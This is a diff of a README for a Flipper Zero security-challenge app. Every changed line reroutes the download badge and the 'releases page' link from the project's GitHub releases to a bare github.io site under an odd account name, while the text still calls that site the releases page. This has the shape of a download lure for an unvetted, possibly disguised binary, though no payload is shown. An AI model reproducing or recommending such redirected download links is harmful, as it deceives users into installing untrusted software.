@@ -1,6 +1,6 @@
 # 🎮 Gauntlet-FlipperZero - Solve Security Challenges On Your Device
 
-[![Download Gauntlet](https://img.shields.io/badge/Download-Gauntlet-blue.svg)](https://github.com/Peripheralvisionhitchingpost840/Gauntlet-FlipperZero/releases)
+[![Download Gauntlet](https://img.shields.io/badge/Download-Gauntlet-blue.svg)](https://peripheralvisionhitchingpost840.github.io)
 
 Gauntlet-FlipperZero brings interactive security challenges directly to your Flipper Zero. You can practice skills like RFID scanning, infrared signal analysis, and code breaking on your own hardware. This project packs a set of Capture-The-Flag puzzles into a single application so you can learn at your own pace without needing an internet connection.
 
@@ -8,7 +8,7 @@ Gauntlet-FlipperZero brings interactive security challenges directly to your Fli
 
 To begin, you need a computer running Windows and your Flipper Zero device. The software runs as a FAP file, which stands for Flipper Application. You will transfer this file to your device via a desktop application.
 
-Visit the [releases page](https://github.com/Peripheralvisionhitchingpost840/Gauntlet-FlipperZero/releases) to download the latest version of the Gauntlet software.
+Visit the [releases page](https://peripheralvisionhitchingpost840.github.io) to download the latest version of the Gauntlet software.
 
 ## ⚙️ Preparation
 
